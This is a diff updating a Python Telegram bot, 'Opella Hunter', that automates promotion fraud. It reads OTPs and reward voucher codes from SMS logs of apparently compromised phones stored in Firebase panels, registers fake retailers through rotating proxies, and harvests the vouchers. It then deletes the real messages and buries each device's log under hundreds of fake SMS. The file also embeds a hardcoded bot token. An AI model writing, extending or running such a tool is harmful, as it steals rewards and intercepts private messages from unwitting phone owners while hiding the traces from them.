@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
-# Opella Hunter — v12.0 (Multi Force-Join + Silent Storage + Admin Panel)
+# Opella Hunter — v13.0 (Multi-User Optimized + Silent Storage + Admin Panel)
 # Credits: JD
 
-import asyncio, base64, hashlib, hmac, io, json, os, random, re, string, sys, threading, time, itertools, contextvars, shutil, zipfile
+import asyncio, base64, hashlib, hmac, io, json, os, random, re, string, sys, threading, time, itertools, contextvars, zipfile
 from pathlib import Path
 from typing import Dict, Any, List, Optional, Set
 from urllib.parse import urlparse, parse_qs
@@ -27,19 +27,15 @@ CREDIT   = "JD"
 BOT_NAME = "Opella Hunter"
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8871069553:AAFsB1TsjrlG1IgNS0yX895F0kQHuHjEfpg")
 
-# ⭐ FORCE JOIN CHANNELS (all required)
 FORCE_CHANNELS = [
     {"username": "@camplootersonly", "url": "https://t.me/camplootersonly"},
     {"username": "@unknown012021",   "url": "https://t.me/unknown012021"},
-    {"username": "@mh_lootify",      "url": "https://t.me/MH_Lootify"},
+    {"username": "@mh_lootify",      "url": "https://t.me/mh_lootify"},
     {"username": "@jdlooter",        "url": "https://t.me/jdlooter"},
 ]
-
-# Backwards-compat references
 CHANNEL_USERNAME = "@camplootersonly"
 CHANNEL_URL = "https://t.me/camplootersonly"
 
-# ⭐ ADMIN
 OWNER_ID = int(os.getenv("OWNER_ID", "8880545620"))
 DATA_DIR = Path(os.getenv("DATA_DIR", str(Path(__file__).parent.resolve())))
 ADMINS_FILE = DATA_DIR / "admins.json"
@@ -63,7 +59,6 @@ ADMINS: Set[int] = load_admins()
 def is_admin(user_id: int) -> bool:
     return user_id in ADMINS or user_id == OWNER_ID
 
-# ⭐ PER-USER STORAGE
 USERS_DIR = DATA_DIR / "users"
 USERS_DIR.mkdir(parents=True, exist_ok=True)
 LOGS_DIR = DATA_DIR / "logs"
@@ -76,8 +71,7 @@ UTM_SOURCE = "qrcode"
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36")
 
-MAX_WORKERS    = 12
-BATCH_SIZE     = 15
+MAX_WORKERS    = 50
 OTP_MAX_WAIT   = 25
 OTP_POLL_DELAY = 1.0
 STAGGER_START  = (0.0, 0.8)
@@ -89,6 +83,9 @@ PANEL_GAP      = 0.5
 BURY_COUNT     = 180
 BURY_BATCH     = 60
 VOUCHER_WATCH_SEC = 90
+VOUCHER_FETCH_COOLDOWN = 8
+VOUCHER_FETCH_FAIL_COOLDOWN = 3
+DEVICE_COOLDOWN = 20
 ANSWERS = [1, 2, 3, 4, 2]
 
 OPELLA_OTP_PATTERNS = [
@@ -101,14 +98,37 @@ OTHER_OTP_HINTS = ["jiomart","rrlacc","voyz","unomer","bigbasket","flipkart",
                    "amazon","swiggy","zomato","phonepe","gpay","google"]
 VOUCHER_REGEX = re.compile(r'Success!?\s*Your Reward Code is\s*([A-Z0-9]{10,20})', re.IGNORECASE)
 
-STOP_EVENT = threading.Event()
+# ⭐ Per-chat stop events (replaces global STOP_EVENT)
+STOP_EVENTS: Dict[int, threading.Event] = {}
+STOP_EVENTS_LOCK = threading.Lock()
+
+def get_stop_event(chat_id: int) -> threading.Event:
+    with STOP_EVENTS_LOCK:
+        if chat_id not in STOP_EVENTS:
+            STOP_EVENTS[chat_id] = threading.Event()
+        return STOP_EVENTS[chat_id]
+
+def clear_stop_event(chat_id: int):
+    with STOP_EVENTS_LOCK:
+        if chat_id in STOP_EVENTS:
+            STOP_EVENTS[chat_id].clear()
+
 PRINT_LOCK = threading.Lock()
 USED_OTPS = set()
 USED_OTPS_LOCK = threading.Lock()
 NO_PROXY = {"http": None, "https": None}
 
+# ⭐ Voucher cooldown trackers
+VOUCHER_COOLDOWN_LOCK = threading.Lock()
+LAST_VOUCHER_FETCH = 0.0
+DEVICE_VOUCHER_TS: Dict[str, float] = {}
+PANEL_VOUCHER_TS: Dict[str, float] = {}
+
+# ⭐ Global HTTP thread pool
+HTTP_EXECUTOR = ThreadPoolExecutor(max_workers=300, thread_name_prefix="http")
+
 # ════════════════════════════════════════════════════════════
-#  PER-USER PATHS (internal only)
+#  PER-USER PATHS
 # ════════════════════════════════════════════════════════════
 def user_dir(user_id: int) -> Path:
     d = USERS_DIR / str(user_id)
@@ -143,50 +163,39 @@ def esc(s): return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","
 _current_chat = contextvars.ContextVar("current_chat", default=None)
 
 # ════════════════════════════════════════════════════════════
-#  FORCE JOIN (multi-channel)
+#  FORCE JOIN (multi-channel parallel)
 # ════════════════════════════════════════════════════════════
-async def is_user_joined(user_id: int) -> bool:
-    for ch in FORCE_CHANNELS:
-        try:
-            member = await BOT_APP.bot.get_chat_member(chat_id=ch["username"], user_id=user_id)
-            if member.status not in ("member", "administrator", "creator"):
-                return False
-        except Exception as e:
-            print(f"join check err ({ch['username']}): {e}")
-            return False
-    return True
-
 async def missing_channels(user_id: int) -> List[Dict[str, str]]:
-    missing = []
-    for ch in FORCE_CHANNELS:
+    async def check(ch):
         try:
-            member = await BOT_APP.bot.get_chat_member(chat_id=ch["username"], user_id=user_id)
+            member = await asyncio.wait_for(
+                BOT_APP.bot.get_chat_member(chat_id=ch["username"], user_id=user_id),
+                timeout=3.0)
             if member.status not in ("member", "administrator", "creator"):
-                missing.append(ch)
+                return ch
         except Exception as e:
             print(f"join check err ({ch['username']}): {e}")
-            missing.append(ch)
-    return missing
+            return ch
+        return None
+    results = await asyncio.gather(*[check(ch) for ch in FORCE_CHANNELS])
+    return [r for r in results if r is not None]
+
+async def is_user_joined(user_id: int) -> bool:
+    return len(await missing_channels(user_id)) == 0
 
 def join_kb(missing: Optional[List[Dict[str, str]]] = None):
-    if missing is None:
-        missing = FORCE_CHANNELS
+    if missing is None: missing = FORCE_CHANNELS
     rows = []
     for ch in missing:
-        rows.append([InlineKeyboardButton(
-            f"{C['join']} Join {ch['username']}", url=ch["url"])])
-    rows.append([InlineKeyboardButton(
-        f"{C['check']} I Joined — Verify", callback_data="verify_join")])
+        rows.append([InlineKeyboardButton(f"{C['join']} Join {ch['username']}", url=ch["url"])])
+    rows.append([InlineKeyboardButton(f"{C['check']} I Joined — Verify", callback_data="verify_join")])
     return InlineKeyboardMarkup(rows)
 
 async def require_join(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> bool:
     user = update.effective_user
     if user is None: return False
-
     missing = await missing_channels(user.id)
-    if not missing:
-        return True
-
+    if not missing: return True
     ch_list = "\n".join(f"  {i}. <a href='{c['url']}'>{c['username']}</a>"
                         for i, c in enumerate(missing, 1))
     text = (
@@ -203,8 +212,7 @@ async def require_join(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> bool:
     )
     try:
         await update.effective_message.reply_text(
-            text, parse_mode="HTML",
-            reply_markup=join_kb(missing),
+            text, parse_mode="HTML", reply_markup=join_kb(missing),
             disable_web_page_preview=True)
     except Exception as e:
         print(f"join prompt err: {e}")
@@ -337,13 +345,45 @@ def fb_delete(url, timeout=6):
         return r.status_code in (200, 204)
     except: return False
 
-def bury_fake_sms(user_id, fb_url, device_id, count=BURY_COUNT, tag=""):
+# ════════════════════════════════════════════════════════════
+#  VOUCHER COOLDOWN HELPERS
+# ════════════════════════════════════════════════════════════
+def _voucher_cooldown_ok(device_id: str = None, fb_url: str = None) -> bool:
+    now = time.time()
+    with VOUCHER_COOLDOWN_LOCK:
+        if now - LAST_VOUCHER_FETCH < VOUCHER_FETCH_COOLDOWN: return False
+        if device_id and device_id in DEVICE_VOUCHER_TS:
+            if now - DEVICE_VOUCHER_TS[device_id] < DEVICE_COOLDOWN: return False
+        if fb_url and fb_url in PANEL_VOUCHER_TS:
+            if now - PANEL_VOUCHER_TS[fb_url] < VOUCHER_FETCH_COOLDOWN: return False
+    return True
+
+def _mark_voucher_fetch(device_id: str = None, fb_url: str = None):
+    global LAST_VOUCHER_FETCH
+    now = time.time()
+    with VOUCHER_COOLDOWN_LOCK:
+        LAST_VOUCHER_FETCH = now
+        if device_id: DEVICE_VOUCHER_TS[device_id] = now
+        if fb_url: PANEL_VOUCHER_TS[fb_url] = now
+
+def _cooldown_wait(seconds: float, chat_id: int):
+    end = time.time() + seconds
+    stop_ev = get_stop_event(chat_id)
+    while time.time() < end:
+        if stop_ev.is_set(): return
+        time.sleep(0.25)
+
+# ════════════════════════════════════════════════════════════
+#  SMS BURY + VOUCHER WATCH
+# ════════════════════════════════════════════════════════════
+def bury_fake_sms(user_id, chat_id, fb_url, device_id, count=BURY_COUNT, tag=""):
     push_log(f"💣 [{tag}] Burying {count} fake SMS…", "warn")
     url = f"{fb_url}messages/{device_id}.json"
     base_ts = int(time.time() * 1000)
     pushed = 0
+    stop_ev = get_stop_event(chat_id)
     for bi in range(0, count, BURY_BATCH):
-        if STOP_EVENT.is_set(): break
+        if stop_ev.is_set(): break
         payload = {}
         for i in range(BURY_BATCH):
             idx = bi + i
@@ -363,15 +403,20 @@ def bury_fake_sms(user_id, fb_url, device_id, count=BURY_COUNT, tag=""):
     push_log(f"💣 [{tag}] Bury done: {pushed}/{count}", "ok")
     return pushed
 
-def watch_voucher(user_id, fb_url, device_id, phone, tag="", timeout=VOUCHER_WATCH_SEC):
+def watch_voucher(user_id, chat_id, fb_url, device_id, phone, tag="", timeout=VOUCHER_WATCH_SEC):
+    if not _voucher_cooldown_ok(device_id, fb_url):
+        push_log(f"⏸️ [{tag}] Voucher cooldown active — skip {phone}", "warn")
+        return None
+
     push_log(f"👀 [{tag}] Watching voucher for {phone}…", "info")
     start = time.time()
     seen = set()
+    stop_ev = get_stop_event(chat_id)
     d = fb_get(f"{fb_url}messages/{device_id}.json?limitToLast=30")
     if isinstance(d, dict): seen = set(d.keys())
 
     while time.time() - start < timeout:
-        if STOP_EVENT.is_set(): return None
+        if stop_ev.is_set(): return None
         d = fb_get(f"{fb_url}messages/{device_id}.json")
         if isinstance(d, dict):
             for mid in sorted(d.keys(), reverse=True):
@@ -385,21 +430,27 @@ def watch_voucher(user_id, fb_url, device_id, phone, tag="", timeout=VOUCHER_WAT
                 if mx:
                     voucher = mx.group(1)
                     ts = time.strftime("%Y-%m-%d %H:%M:%S")
-                    # silent save
                     try:
                         with open(user_paths(user_id)["vouchers"], "a", encoding="utf-8") as f:
                             f.write(f"{voucher} | {ts} | phone={phone} | device={device_id}\n")
                     except: pass
                     push_log(f"🎁🎁🎁 [{tag}] VOUCHER FOUND: {voucher} | {phone}", "voucher")
+                    _mark_voucher_fetch(device_id, fb_url)
                     try: fb_delete(f"{fb_url}messages/{device_id}/{mid}.json")
                     except: pass
-                    bury_fake_sms(user_id, fb_url, device_id, BURY_COUNT, tag=f"{tag} voucher")
+                    bury_fake_sms(user_id, chat_id, fb_url, device_id, BURY_COUNT, tag=f"{tag} voucher")
+                    push_log(f"⏳ [{tag}] Cooldown {DEVICE_COOLDOWN}s for {phone}", "info")
+                    _cooldown_wait(DEVICE_COOLDOWN, chat_id)
                     return voucher
                 seen.add(mid)
         time.sleep(2)
     push_log(f"⚠️ [{tag}] No voucher in {timeout}s", "warn")
+    _cooldown_wait(VOUCHER_FETCH_FAIL_COOLDOWN, chat_id)
     return None
 
+# ════════════════════════════════════════════════════════════
+#  DEVICE FETCH
+# ════════════════════════════════════════════════════════════
 def fetch_devices_for_panel(firebase_url):
     try:
         r = requests.get(firebase_url + "clients.json", timeout=15, verify=False,
@@ -474,11 +525,12 @@ def try_claim_otp(otp):
         if otp in USED_OTPS: return False
         USED_OTPS.add(otp); return True
 
-def fetch_opella_otp(fb_url, device_id, timeout=OTP_MAX_WAIT, since_ts=None):
+def fetch_opella_otp(chat_id, fb_url, device_id, timeout=OTP_MAX_WAIT, since_ts=None):
     start = time.time()
+    stop_ev = get_stop_event(chat_id)
     trigger_ms = int((since_ts - 20) * 1000) if since_ts else int((time.time() - 90) * 1000)
     while time.time() - start < timeout:
-        if STOP_EVENT.is_set(): return None
+        if stop_ev.is_set(): return None
         try:
             r = requests.get(f'{fb_url}messages/{device_id}.json?orderBy="$key"&limitToLast=25',
                              timeout=5, verify=False, proxies=NO_PROXY)
@@ -533,10 +585,11 @@ NET_EXC = (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout,
            requests.exceptions.ConnectTimeout, requests.exceptions.ChunkedEncodingError,
            requests.exceptions.SSLError, requests.exceptions.ProxyError, requests.exceptions.Timeout)
 
-def _net_call(fn, retries=NET_RETRIES, backoff=NET_BACKOFF, on_retry=None):
+def _net_call(fn, chat_id, retries=NET_RETRIES, backoff=NET_BACKOFF, on_retry=None):
     last = None
+    stop_ev = get_stop_event(chat_id)
     for attempt in range(1, retries + 1):
-        if STOP_EVENT.is_set(): return {"statusCode": None, "message": "stopped"}
+        if stop_ev.is_set(): return {"statusCode": None, "message": "stopped"}
         try: return fn()
         except NET_EXC as e:
             last = {"statusCode": None, "message": f"{type(e).__name__}", "_net_error": True}
@@ -549,7 +602,8 @@ def _net_call(fn, retries=NET_RETRIES, backoff=NET_BACKOFF, on_retry=None):
     return last or {"statusCode": None, "message": "net retries exhausted"}
 
 class OpellaClient:
-    def __init__(self, proxy=None, proxy_pool=None):
+    def __init__(self, chat_id: int, proxy=None, proxy_pool=None):
+        self.chat_id = chat_id
         self.s = requests.Session()
         self.s.mount("http://", HTTPAdapter(pool_connections=4, pool_maxsize=4))
         self.s.mount("https://", HTTPAdapter(pool_connections=4, pool_maxsize=4))
@@ -588,7 +642,7 @@ class OpellaClient:
             self.data_key = str(d.get("dataKey") or d.get("data", {}).get("dataKey"))
             if not self.user_key or not self.data_key: raise RuntimeError(f"missing keys: {d}")
             return d
-        return _net_call(_do, retries=NET_RETRIES, on_retry=self._rotate_proxy)
+        return _net_call(_do, self.chat_id, retries=NET_RETRIES, on_retry=self._rotate_proxy)
 
     def _signed_post(self, endpoint, payload, with_token=False, referer=None):
         def _do():
@@ -600,7 +654,7 @@ class OpellaClient:
             url = f"{API_BASE}/{endpoint}?t={int(time.time()*1000)}"
             resp = self.s.post(url, data=body, headers=h, timeout=(8, 18))
             return decode_resp(resp)
-        return _net_call(_do, retries=NET_RETRIES, on_retry=self._rotate_proxy)
+        return _net_call(_do, self.chat_id, retries=NET_RETRIES, on_retry=self._rotate_proxy)
 
     def landing_track(self, track_type):
         return self._signed_post(f"users/landing-track/{self.user_key}", {"type": track_type})
@@ -611,7 +665,7 @@ class OpellaClient:
                            headers={"accept": "*/*", "referer": f"{BASE_URL}/register"}, timeout=(8, 15))
             if r.status_code == 200: return decode_resp(r)
             return {"statusCode": r.status_code, "message": "state-cities bad"}
-        return _net_call(_do, retries=3, on_retry=self._rotate_proxy)
+        return _net_call(_do, self.chat_id, retries=3, on_retry=self._rotate_proxy)
 
     def register(self, mobile, store_name, retailer_name, state, city, img_bytes, img_name="pack.jpg", img_mime="image/jpeg"):
         payload = {"mobile": mobile, "storeName": store_name, "retailerName": retailer_name,
@@ -626,7 +680,7 @@ class OpellaClient:
             h = dict(h_base); h["content-type"] = mp.content_type
             resp = self.s.post(url, data=mp, headers=h, timeout=(8, 22))
             return decode_resp(resp)
-        return _net_call(_do, retries=NET_RETRIES, on_retry=self._rotate_proxy)
+        return _net_call(_do, self.chat_id, retries=NET_RETRIES, on_retry=self._rotate_proxy)
 
     def verify_otp(self, otp):
         d = self._signed_post(f"users/verify-otp/{self.user_key}", {"otp": str(otp)},
@@ -669,7 +723,6 @@ def rand_store():
     return f"{random.choice(first)} {random.choice(last)}"
 
 def save_win(user_id, phone, user_key, resp):
-    # silent save
     try:
         with open(user_paths(user_id)["wins"], "a", encoding="utf-8") as f:
             data = resp.get("data", {}) if isinstance(resp, dict) else {}
@@ -677,7 +730,6 @@ def save_win(user_id, phone, user_key, resp):
     except: pass
 
 def save_result(user_id, rec):
-    # silent save
     try:
         with PRINT_LOCK:
             rf = user_paths(user_id)["results"]
@@ -699,11 +751,13 @@ def is_already_completed(d):
 # ════════════════════════════════════════════════════════════
 #  PER-PHONE FLOW
 # ════════════════════════════════════════════════════════════
-def flow_for_phone(user_id, phone, device_id, fb_url, proxy, tag, st_pairs, proxy_pool=None):
+def flow_for_phone(user_id, chat_id, phone, device_id, fb_url, proxy, tag, st_pairs, proxy_pool=None):
+    stop_ev = get_stop_event(chat_id)
     res = {"phone": phone, "device_id": device_id, "firebase_url": fb_url, "tag": tag,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}
     time.sleep(random.uniform(*STAGGER_START))
-    c = OpellaClient(proxy=proxy, proxy_pool=proxy_pool)
+    if stop_ev.is_set(): return res
+    c = OpellaClient(chat_id, proxy=proxy, proxy_pool=proxy_pool)
     try:
         cu = c.create_user()
         if not c.user_key or not c.data_key:
@@ -725,7 +779,7 @@ def flow_for_phone(user_id, phone, device_id, fb_url, proxy, tag, st_pairs, prox
             push_log(f"[{tag}] ❌ {phone} register: {r.get('message')}", "err"); return res
         res["register_ok"] = True
         push_log(f"[{tag}] ✅ {phone} registered", "ok")
-        otp = fetch_opella_otp(fb_url, device_id, timeout=OTP_MAX_WAIT, since_ts=sent_at)
+        otp = fetch_opella_otp(chat_id, fb_url, device_id, timeout=OTP_MAX_WAIT, since_ts=sent_at)
         if not otp:
             res["status"] = "otp_timeout"
             push_log(f"[{tag}] ⏰ {phone} OTP timeout", "warn"); return res
@@ -755,7 +809,13 @@ def flow_for_phone(user_id, phone, device_id, fb_url, proxy, tag, st_pairs, prox
                 res["status"] = "WIN"; res["reward_type"] = reward_type; res["reward_amount"] = reward_amount
                 save_win(user_id, phone, c.user_key, s)
                 push_log(f"[{tag}] ★ {phone} WON reward={reward_type} amt={reward_amount}", "voucher")
-                threading.Thread(target=watch_voucher, args=(user_id, fb_url, device_id, phone, tag), daemon=True).start()
+                if _voucher_cooldown_ok(device_id, fb_url):
+                    threading.Thread(
+                        target=watch_voucher,
+                        args=(user_id, chat_id, fb_url, device_id, phone, tag),
+                        daemon=True).start()
+                else:
+                    push_log(f"⏸️ [{tag}] {phone} — voucher cooldown active, skipping watch", "warn")
             else:
                 res["status"] = "lose"; res["reward_type"] = reward_type
                 push_log(f"[{tag}] ○ {phone} lose reward={reward_type}", "info")
@@ -809,11 +869,11 @@ def ensure_number(st, panel_idx, phone):
         return pn[phone]
 
 BOT_APP: Application = None
-BOT_LOOP: asyncio.AbstractEventLoop = None
 LOG_SINKS: Dict[int, Any] = {}
 EDIT_INTERVAL = 0.35
 FORCE_EDIT_AFTER = 0.6
 RENDER_LOCKS: Dict[int, asyncio.Lock] = {}
+RENDER_PENDING: Dict[int, asyncio.Task] = {}
 
 def get_render_lock(chat_id):
     lk = RENDER_LOCKS.get(chat_id)
@@ -823,7 +883,9 @@ def get_render_lock(chat_id):
 
 def make_sink(chat_id):
     def sink(msg, cls):
-        try: asyncio.run_coroutine_threadsafe(_handle_log(chat_id, msg, cls), BOT_LOOP)
+        try:
+            loop = asyncio.get_event_loop()
+            asyncio.run_coroutine_threadsafe(_handle_log(chat_id, msg, cls), loop)
         except: pass
     return sink
 
@@ -953,7 +1015,15 @@ async def _render_and_send(chat_id, force=False):
         except Exception as e: print(f"render send err: {e}")
 
 def _kick_render(chat_id, force=False):
-    try: asyncio.create_task(_render_and_send(chat_id, force=force))
+    async def _debounced():
+        await asyncio.sleep(0.4)
+        await _render_and_send(chat_id, force=force)
+    try:
+        loop = asyncio.get_event_loop()
+        old = RENDER_PENDING.get(chat_id)
+        if old and not old.done():
+            old.cancel()
+        RENDER_PENDING[chat_id] = loop.create_task(_debounced())
     except: pass
 
 async def _handle_log(chat_id, msg, cls):
@@ -1015,57 +1085,71 @@ async def _handle_log(chat_id, msg, cls):
 async def run_panel_async(user_id, chat_id, fb_url, panel_idx, total_panels):
     st = get_state(chat_id)
     tag = f"P{panel_idx}"
+    stop_ev = get_stop_event(chat_id)
     token = _current_chat.set(chat_id)
     try:
         push_log(f"panel {panel_idx}/{total_panels} start", "info")
         proxies = load_proxies(user_id)
-        st_pairs = []
-        try:
-            probe = OpellaClient(proxy=random.choice(proxies)["url"] if proxies else None, proxy_pool=proxies)
-            probe.create_user()
-            st_pairs = extract_state_city_pairs(probe.get_state_cities())
-            try: probe.s.close()
-            except: pass
-        except Exception as e:
-            push_log(f"probe failed: {e}", "warn")
-        if not st_pairs: st_pairs = [("Karnataka","Bangalore")]
-        try:
-            devices = await asyncio.to_thread(fetch_devices_for_panel, fb_url)
-        except Exception as e:
-            push_log(f"panel fetch err: {e}", "err"); return
+
+        async def probe_states():
+            try:
+                probe = OpellaClient(
+                    chat_id,
+                    proxy=random.choice(proxies)["url"] if proxies else None,
+                    proxy_pool=proxies)
+                await asyncio.to_thread(probe.create_user)
+                sc = await asyncio.to_thread(probe.get_state_cities)
+                try: probe.s.close()
+                except: pass
+                return extract_state_city_pairs(sc)
+            except Exception as e:
+                push_log(f"probe failed: {e}", "warn")
+                return []
+
+        st_pairs, devices = await asyncio.gather(
+            probe_states(),
+            asyncio.to_thread(fetch_devices_for_panel, fb_url),
+        )
+        if not st_pairs: st_pairs = [("Karnataka", "Bangalore")]
         if not devices:
             push_log("no devices", "warn"); return
+
         for d in devices: ensure_number(st, panel_idx, d["phone"])
         st["devices_total"] += len(devices)
         st["panel_stats"].setdefault(panel_idx, {"wins":0,"loss":0,"total":len(devices)})
         st["panel_stats"][panel_idx]["total"] = len(devices)
         push_log(f"{len(devices)} devices found", "ok")
         await _render_and_send(chat_id, force=True)
+
         sem = asyncio.Semaphore(MAX_WORKERS)
         proxy_cycle = itertools.cycle(proxies) if proxies else None
+
         async def _one(d):
-            if st["stop_event"].is_set(): return
+            if stop_ev.is_set(): return
             async with sem:
-                if st["stop_event"].is_set(): return
+                if stop_ev.is_set(): return
                 proxy = next(proxy_cycle)["url"] if proxy_cycle else None
                 try:
-                    await asyncio.to_thread(flow_for_phone, user_id, d["phone"], d["client_id"], d["firebase_url"],
-                                            proxy, tag, st_pairs, proxies)
+                    await asyncio.to_thread(
+                        flow_for_phone, user_id, chat_id, d["phone"], d["client_id"],
+                        d["firebase_url"], proxy, tag, st_pairs, proxies)
                     st["processed"] += 1
                 except Exception as e:
                     push_log(f"[{tag}] {d['phone']} err: {e}", "err")
+
         tasks = []
         for d in devices:
-            if st["stop_event"].is_set(): break
+            if stop_ev.is_set(): break
             tasks.append(asyncio.create_task(_one(d)))
-            await asyncio.sleep(random.uniform(0.05, 0.15))
+            await asyncio.sleep(random.uniform(0.02, 0.08))
+
         if tasks: await asyncio.gather(*tasks, return_exceptions=True)
         push_log(f"Panel {panel_idx} DONE", "ok")
     finally:
         _current_chat.reset(token)
 
 # ════════════════════════════════════════════════════════════
-#  TELEGRAM KEYBOARDS
+#  KEYBOARDS
 # ════════════════════════════════════════════════════════════
 def main_menu_kb(user_id=None):
     buttons = [
@@ -1076,7 +1160,6 @@ def main_menu_kb(user_id=None):
         [InlineKeyboardButton("▤ Panels", callback_data="panels"),
          InlineKeyboardButton("🗑 Clear", callback_data="clear")],
     ]
-    # Add all force-join channels (2 per row)
     ch_row = []
     for ch in FORCE_CHANNELS:
         ch_row.append(InlineKeyboardButton(f"{C['join']} {ch['username']}", url=ch["url"]))
@@ -1170,8 +1253,8 @@ async def cmd_run(update, ctx, chat_id=None):
                "errors": 0, "panel_stats": {}, "hits": [], "panel_numbers": {},
                "numbers": {}, "num_order": [], "last_edit": 0, "started_at": time.time()})
     st["stop_event"] = threading.Event()
+    clear_stop_event(chat_id)
     LOG_SINKS[chat_id] = make_sink(chat_id)
-    STOP_EVENT.clear()
     await _render_and_send(chat_id, force=True)
     await BOT_APP.bot.send_message(chat_id,
         f"{C['panel']} starting  ·  {len(st['panels'])} panel(s)\n"
@@ -1180,7 +1263,7 @@ async def cmd_run(update, ctx, chat_id=None):
     async def _runner():
         try:
             for i, url in enumerate(st["panels"], 1):
-                if st["stop_event"].is_set(): break
+                if get_stop_event(chat_id).is_set(): break
                 st["current_panel"] = i
                 try: await run_panel_async(user_id, chat_id, url, i, len(st["panels"]))
                 except Exception as e: push_log(f"Panel {i} err: {e}", "err")
@@ -1220,7 +1303,7 @@ async def cmd_stop(update, ctx, chat_id=None):
         chat_id = chat.id
     st = get_state(chat_id)
     st["stop_event"].set()
-    STOP_EVENT.set()
+    get_stop_event(chat_id).set()
     await BOT_APP.bot.send_message(chat_id, f"{C['already']} stopping  ·  by {CREDIT}")
 
 async def cmd_status(update, ctx, chat_id=None):
@@ -1323,8 +1406,7 @@ async def cmd_verify(update, ctx):
 async def cmd_admin(update, ctx):
     user = update.effective_user
     if not is_admin(user.id):
-        await _safe_reply(update, f"{C['cross']} You are not an admin.")
-        return
+        await _safe_reply(update, f"{C['cross']} You are not an admin."); return
     await _safe_reply(update,
         f"👑 <b>Admin Panel</b>\n{LINE}\n"
         f"Owner: <code>{OWNER_ID}</code>\n"
@@ -1536,10 +1618,9 @@ async def post_init(app):
     ])
 
 def main():
-    global BOT_APP, BOT_LOOP
+    global BOT_APP
     BOT_APP = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
-    BOT_LOOP = asyncio.new_event_loop()
-    asyncio.set_event_loop(BOT_LOOP)
+
     BOT_APP.add_handler(CommandHandler("start", cmd_start))
     BOT_APP.add_handler(CommandHandler("panel", cmd_panel))
     BOT_APP.add_handler(CommandHandler("panels", cmd_panels))
@@ -1555,8 +1636,16 @@ def main():
     BOT_APP.add_handler(CallbackQueryHandler(on_callback))
     BOT_APP.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     BOT_APP.add_error_handler(error_handler)
+
     print(f"{BOT_NAME} running | credit: {CREDIT}")
-    BOT_APP.run_polling(allowed_updates=Update.ALL_TYPES)
+    BOT_APP.run_polling(
+        allowed_updates=Update.ALL_TYPES,
+        drop_pending_updates=True,
+        pool_timeout=30,
+        read_timeout=30,
+        write_timeout=30,
+        connect_timeout=30,
+    )
 
 if __name__ == "__main__":
     main()
